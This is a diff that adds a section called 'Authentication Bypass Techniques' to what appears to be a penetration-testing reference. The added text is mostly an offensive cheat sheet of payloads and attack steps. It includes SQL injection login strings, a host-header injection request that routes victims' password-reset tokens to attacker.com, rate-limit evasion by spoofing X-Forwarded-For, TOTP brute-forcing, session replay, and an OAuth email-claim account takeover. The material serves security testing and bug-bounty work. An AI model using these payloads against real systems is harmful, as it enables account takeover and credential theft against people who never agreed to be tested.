@@ -1521,3 +1521,115 @@ nuclei -t ~/nuclei-templates/vulnerabilities/generic/auth-bypass.yaml -u https:/
 - RFC 7519 (JWT), RFC 6749 (OAuth 2.0), RFC 8693 (Token Exchange), RFC 9449 (DPoP)
 - HackerOne Hacktivity: authentication category reports
 - Bug Bounty case studies: Instagram $15k (MFA bypass), Microsoft $13k (MFA bypass), Shopify $6k (race condition), Grammarly $5k (OAuth)
+
+
+---
+
+## From hack-skills: Authentication Bypass Techniques
+
+### SQL Injection Login Bypass
+
+```sql
+-- Basic bypass (admin assumed first row):
+Username: admin'--
+Password: anything
+
+-- Generic (logs in as first user):
+Username: ' OR '1'='1'--
+Password: anything
+
+-- Variants:
+Username: 1' OR '1'='1'/*
+Username: admin' OR 'a'='a
+```
+
+### Password Reset Vulnerabilities
+
+**Predictable tokens — check for:**
+```
+Timestamp-based: token=1691234567890
+Sequential: token=1001, 1002
+MD5(email): echo -n "user@example.com" | md5sum
+Short: 4-6 digits (brute-forceable)
+```
+
+**Host Header Injection in Reset Email:**
+```http
+POST /forgot-password HTTP/1.1
+Host: attacker.com          ← inject attacker domain
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@target.com
+→ Reset email to victim contains attacker.com link
+→ Victim clicks → token captured at attacker.com
+```
+
+**Token in Referer leak**: reset page loads third-party analytics → Referer: https://target.com/reset?token=TOKEN leaked to third party.
+
+**Token not expiring / reuse**: use same reset token 48h later; use T1 after already resetting password.
+
+### Account Enumeration
+
+```
+Error messages: "User not found" vs "Incorrect password" → enumerate valid usernames
+Response timing: valid username causes slower DB lookup
+Password reset: "Email not registered" vs generic message
+Registration: "Email already registered" → confirms account exists
+```
+
+### Brute Force Bypass
+
+```
+IP rotation: X-Forwarded-For: 1.1.1.1 → change per request
+X-Real-IP: 2.2.2.2
+
+Reverse brute: try ONE password ("password123") across all users
+→ no single account lockout
+
+Lockout resets: 9 attempts → wait 30 min → 9 more → repeat
+```
+
+### MFA / 2FA Bypass Techniques
+
+```
+1. Session before 2FA: after password step, session cookie set
+   → directly access /dashboard without completing 2FA page
+
+2. 2FA brute force (if no lockout on 2FA step):
+   4-6 digit TOTP = ≤1,000,000 codes → brute with Burp Intruder
+
+3. Code reuse: use same TOTP code twice → server should reject
+
+4. Backup codes: check if rate-limited, single-use, short enough to brute
+
+5. 2FA only on login, not on critical actions:
+   DELETE /account checks 2FA? Or just login?
+```
+
+### Session Management Flaws
+
+```
+Logout invalidation: log in → capture cookie → log out → replay cookie
+Session regeneration: low-priv session → admin upgrades role → old cookie has admin?
+Predictable tokens: base64(userid+timestamp), sequential IDs, short random (32-bit)
+```
+
+### Username Manipulation
+
+```
+bcrypt 72-byte truncation: "A"*100 == "A"*72 at login
+Null byte: username=admin%00 → truncation in C-string comparison
+Unicode normalization: "ⓢcott" normalizes to "scott" → impersonation
+```
+
+### OAuth/SSO Account Takeover Patterns
+
+```
+Email claim trust:
+  1. Create OAuth provider account with email = victim@target.com
+  2. Link via that provider → server trusts email claim → account merge
+
+SSO-only account password reset:
+  User linked Google SSO, forgot password → "forgot password" sets new password
+  → bypasses SSO requirement, enables direct login
+```
